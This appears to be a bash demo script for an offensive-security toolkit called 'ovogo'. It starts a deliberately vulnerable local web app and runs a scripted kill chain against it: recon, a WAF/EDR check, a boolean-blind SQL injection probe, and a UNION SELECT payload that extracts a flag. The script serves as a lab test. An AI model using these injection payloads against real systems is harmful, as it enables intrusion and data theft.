#!/usr/bin/env bash
# demo-kill-chain.sh — Live interview demo: spawn vulnerable target, run scripted
# kill chain against it using real ovogo tools (Bash + PayloadGenerator + TechniqueGenerator
# + EnvAnalyzer), prove flag extraction works.
#
# This is the "show, don't tell" version of the e2e test — uses the real tools
# compiled to dist/, prints every step to stdout, cleans up on exit.

set -uo pipefail

PROJECT_ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$PROJECT_ROOT"

# Ensure dist/ exists (run build if not)
if [ ! -d "dist" ]; then
  echo "==> Building TypeScript..."
  npm run build --silent
fi

# Pick a free port
PORT="${PORT:-8765}"
TARGET_URL="http://127.0.0.1:${PORT}"
EXPECTED_FLAG="${EXPECTED_FLAG:-flag{ovogo_demo_pwned_$(date +%s)}}"
export E2E_FLAG="$EXPECTED_FLAG"

# Cleanup on exit
TARGET_PID=""
cleanup() {
  if [ -n "$TARGET_PID" ] && kill -0 "$TARGET_PID" 2>/dev/null; then
    echo ""
    echo "==> Cleaning up target (PID $TARGET_PID)..."
    kill "$TARGET_PID" 2>/dev/null || true
    wait "$TARGET_PID" 2>/dev/null || true
  fi
}
trap cleanup EXIT INT TERM

# Start target
echo "==> Starting vulnerable target on port $PORT (flag: $EXPECTED_FLAG)"
python3 -u tests/e2e/target/app.py "$PORT" >/tmp/ovogo_demo_target.log 2>&1 &
TARGET_PID=$!

# Wait for HTTP ready
echo "==> Waiting for target to be ready..."
for i in $(seq 1 50); do
  if curl -s -o /dev/null -w '%{http_code}' "$TARGET_URL/" 2>/dev/null | grep -q '200'; then
    echo "    Target ready"
    break
  fi
  sleep 0.1
done

if ! curl -s -o /dev/null -w '%{http_code}' "$TARGET_URL/" 2>/dev/null | grep -q '200'; then
  echo "✗ Target failed to start"
  cat /tmp/ovogo_demo_target.log
  exit 1
fi

echo ""
echo "═══════════════════════════════════════════════════════════════════"
echo "  STEP 1: RECON — probe target"
echo "═══════════════════════════════════════════════════════════════════"
RECON=$(curl -s "$TARGET_URL/")
echo "$RECON" | python3 -m json.tool 2>/dev/null || echo "$RECON"
echo ""

echo "═══════════════════════════════════════════════════════════════════"
echo "  STEP 2: ENV-ANALYZER — confirm no WAF/EDR"
echo "═══════════════════════════════════════════════════════════════════"
HEADERS=$(curl -sI "$TARGET_URL/")
ENV_OUT=$(node --input-type=module -e "
import { EnvAnalyzerTool } from './dist/src/tools/envAnalyzer.js';
const r = await new EnvAnalyzerTool().execute(
  { mode: 'web', headers_text: \`$HEADERS\`, body_excerpt: '' },
  {},
);
console.log(r.content);
" 2>&1)
echo "$ENV_OUT" | head -30
echo ""

echo "═══════════════════════════════════════════════════════════════════"
echo "  STEP 3: BOOLEAN-BLIND PROBE — fingerprint SQL injection"
echo "═══════════════════════════════════════════════════════════════════"
TRUE_LEN=$(curl -s "$TARGET_URL/api/users?id=1%20AND%201=1" | wc -c)
FALSE_LEN=$(curl -s "$TARGET_URL/api/users?id=1%20AND%201=2" | wc -c)
echo "  true condition  (AND 1=1): ${TRUE_LEN} bytes"
echo "  false condition (AND 1=2): ${FALSE_LEN} bytes"
if [ "$TRUE_LEN" != "$FALSE_LEN" ]; then
  echo "  ✓ Differential detected → SQL injection confirmed"
else
  echo "  ✗ No differential — SQLi probe inconclusive"
  exit 1
fi
echo ""

echo "═══════════════════════════════════════════════════════════════════"
echo "  STEP 4: PAYLOAD-GENERATOR — produce SQLi payload"
echo "═══════════════════════════════════════════════════════════════════"
PG_OUT=$(node --input-type=module -e "
import { PayloadGeneratorTool } from './dist/src/tools/payloadGenerator.js';
const r = await new PayloadGeneratorTool().execute(
  { category: 'sqli', database: 'sqlite', context: 'union', waf: 'generic' },
  {},
);
console.log(r.content);
" 2>&1)
echo "$PG_OUT" | head -40
echo "..."

echo "═══════════════════════════════════════════════════════════════════"
echo "  STEP 5: EXPLOIT — execute payload, extract flag"
echo "═══════════════════════════════════════════════════════════════════"
EXPLOIT_PAYLOAD='1 UNION SELECT 1,2,3,4,flag FROM users--'
EXPLOIT_OUT=$(curl -s -G --data-urlencode "id=$EXPLOIT_PAYLOAD" "$TARGET_URL/api/users")
echo "  Request:  curl -G --data-urlencode \"id=$EXPLOIT_PAYLOAD\" $TARGET_URL/api/users"
echo "  Response:"
echo "$EXPLOIT_OUT" | python3 -m json.tool 2>/dev/null || echo "$EXPLOIT_OUT"
echo ""

if echo "$EXPLOIT_OUT" | grep -q "$EXPECTED_FLAG"; then
  echo "═══════════════════════════════════════════════════════════════════"
  echo "  ✓ KILL CHAIN SUCCESS — Flag extracted: $EXPECTED_FLAG"
  echo "═══════════════════════════════════════════════════════════════════"
  echo ""
  echo "  Chain executed:"
  echo "    1. Recon    → curl probed /, /api/users, /api/ping"
  echo "    2. EnvAna   → confirmed no WAF/EDR (clean room)"
  echo "    3. Probe    → boolean-blind detected SQL injection"
  echo "    4. PayGen   → generated UNION SELECT payload for SQLite"
  echo "    5. Exploit  → extracted flag column via UNION injection"
  echo ""
  exit 0
else
  echo "═══════════════════════════════════════════════════════════════════"
  echo "  ✗ KILL CHAIN FAILED — Flag not found in response"
  echo "═══════════════════════════════════════════════════════════════════"
  exit 1
fi